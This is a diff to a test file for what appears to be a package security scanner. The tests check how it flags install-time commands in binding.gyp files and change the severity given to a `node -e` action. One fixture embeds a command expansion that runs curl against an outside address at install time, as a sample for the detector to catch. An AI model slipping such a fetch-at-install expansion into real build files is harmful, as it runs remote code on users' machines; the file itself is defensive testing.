@@ -46,17 +46,17 @@ test("prepare family: INFO in a project unless suspicious; not an install hook f
 
 test("binding.gyp: Python-literal syntax, actions anywhere, command expansions", () => {
   // gyp files are Python literals (comments, single quotes, trailing commas);
-  // an action is judged by the raw INSTALL_HOOK_RE (`node -e` → CRITICAL)
+  // an action is judged by what its command does (0.1.8): `node -e` alone is only a hint
   const literal = "# a comment\n{\n  'targets': [{\n    'target_name': 'x',\n" +
     "    'actions': [{'action_name': 'gen', 'action': ['node', '-e', \"require('./build')\"]}],\n  }],\n}\n";
   assert.deepEqual(scanGyp("binding.gyp", literal).map((i) => [i.line, i.sev, i.cmd]),
-    [[5, "CRITICAL", "node -e require('./build')"]]);
+    [[5, "MAJOR", "node -e require('./build')"]]);
   const expansions = "{'targets': [{'target_name': 'x',\n" +
     " 'include_dirs': [\"<!(node -p \\\"require('node-addon-api').include\\\")\"],\n" +
     " 'libraries': ['<!(curl -s http://192.0.2.1/lib)'],\n" +
     " 'conditions': [['OS==\"linux\"', {'actions': [{'action': ['sh', 'gen.sh']}]}]]}]}\n";
   assert.deepEqual(brief(scanGyp("binding.gyp", expansions)), [
-    ["SC-INSTALL-HOOK", 3, "CRITICAL", "\"binding.gyp command expansion\" script runs a network-fetch/eval command at install time."],
+    ["SC-INSTALL-HOOK", 3, "CRITICAL", "\"binding.gyp command expansion\" script contacts an address typical of data exfiltration (http://192.0.2.1)."],
     ["SC-INSTALL-HOOK", 4, "MAJOR", "\"binding.gyp action\" script runs code at install time: 'sh gen.sh'."],
   ]);
 });
